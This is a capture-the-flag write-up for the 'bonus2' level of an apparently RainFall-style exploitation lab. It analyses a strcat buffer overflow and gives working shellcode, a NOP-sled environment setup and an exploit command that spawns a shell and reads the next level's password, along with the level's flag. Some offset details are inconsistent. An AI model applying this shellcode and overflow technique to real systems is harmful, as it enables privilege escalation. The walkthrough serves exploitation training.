# Bonus2

## **Binary Analysis**

After analyzing the binary with GDB, we found that the program takes two command-line arguments.

- The `main` function creates a 160-byte buffer and uses `strncpy` to copy the first argument (maximum 40 bytes) and the second argument (maximum 32 bytes). It then checks for the environment variable `LANG` and sets a global variable accordingly:
    - `LANG=fi` → 1
    - `LANG=nl` → 2
    - Otherwise → 0

```nasm
; Arguments check
0x08048532 <+9>:     sub    $0xa0,%esp        ; Allocates 160 bytes
0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)    ; Checks for 3 arguments

; Buffer operations
0x08048548 <+31>:    lea    0x50(%esp),%ebx   ; Buffer at esp+0x50
0x0804854c <+35>:    mov    $0x0,%eax         ; Zero initialization
0x08048551 <+40>:    mov    $0x13,%edx        ; Size 0x13 (19)

; First strncpy
0x08048564 <+59>:    movl   $0x28,0x8(%esp)   ; Size 0x28 (40)
0x0804857c <+83>:    mov    0xc(%ebp),%eax    ; argv[1]
0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>

; Second strncpy
0x08048584 <+91>:    movl   $0x20,0x8(%esp)   ; Size 0x20 (32)
0x0804858c <+99>:    mov    %eax,0x4(%esp)    ; argv[2]
0x08048590 <+103>:   lea    0x50(%esp),%eax
0x08048594 <+107>:   add    $0x28,%eax        ; Buffer + 40

; Environment check
0x0804859f <+118>:   movl   $0x8048738,(%esp) ; "LANG" environment variable
0x080485a6 <+125>:   call   0x8048380 <getenv@plt>

; Final function call
0x0804862b <+258>:   call   0x8048484 <greetuser>

```

- The `greetuser` function creates a 72-byte buffer based on the `LANG` value, copies different greetings, and appends the main buffer using `strcat`.
    - Default: "Hello "
    - `LANG=fi`: "Hyvää päivää"
    - `LANG=nl`: "Goedemiddag! "
    - The result is printed using `puts`.

```nasm
; Buffer setup
0x08048487 <+3>:     sub    $0x58,%esp      ; Allocates 88 bytes
0x080484a2 <+30>:    lea    -0x48(%ebp),%eax ; Buffer at ebp-72

; Critical vulnerability
0x0804850a <+134>:   lea    0x8(%ebp),%eax   ; Source (our input)
0x08048511 <+141>:   lea    -0x48(%ebp),%eax ; Destination buffer
0x08048517 <+147>:   call   0x8048370 <strcat@plt> ; Vulnerable strcat!

```

## **Vulnerability**

We found a buffer overflow in `greetuser`. The `strcat` function is used without bounds checking. The total bytes written are:

- "Goedemiddag! " (12 bytes)
- `arg1` (40 bytes)
- `arg2` (32 bytes)
- **Total = 84 bytes**

Since the buffer size is **72 bytes**, the overflow is:

```
84 - 72 = 12 bytes (overflow into return address)

```

## **Exploit**

To exploit this, we store our shellcode in memory using the environment variable `LANG` and retrieve the buffer start address.

1. Environment Setup:

```bash
# Set Dutch language for the longest greeting
export LANG=nl

# Create shellcode with NOP sled
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

```

2. Return Address Calculation:

```nasm
(gdb) b main
(gdb) r
(gdb) x/s *((char **)environ)
0xbffff862: "SHELLCODE=\x90\x90\x90..."

```

- Start of `SHELLCODE`: `0xbffff862`
- "SHELLCODE=" (9 bytes offset) → `0xbffff86b`
- We can use a return address range from `0xbffff86b` to `0xbffff8d5`

3. Exploit Code:

```bash
./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\xd5\xf8\xff\xbf"'`
```

The program copies our `Goedemiddag!` , first, and second arguments into memory:

```
Memory layout:
|--12 bytes--|------------40 'A's------------------|--------23 'B's--------| |--ret addr--|

```

4. Result:

```bash
bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\xd5\xf8\xff\xbf"'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$  cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$
```

## **Flag**

```nasm
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```